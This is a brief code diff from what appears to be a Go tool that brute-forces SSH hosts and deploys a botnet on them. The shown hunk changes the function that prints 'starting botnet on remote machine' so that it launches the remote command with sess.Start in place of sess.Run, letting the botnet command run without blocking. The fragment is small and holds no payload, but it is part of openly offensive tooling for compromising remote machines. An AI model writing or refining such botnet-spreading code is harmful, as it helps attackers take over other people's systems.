@@ -117,7 +117,7 @@ func (a *Attack) bruteForce(host string) {
 
 func (a *Attack) execute(cmd string, sess *ssh.Session) error {
 	fmt.Println("[*] starting botnet on remote machine...")
-	if err := sess.Run(cmd); err != nil {
+	if err := sess.Start(cmd); err != nil {
 		return err
 	}
 
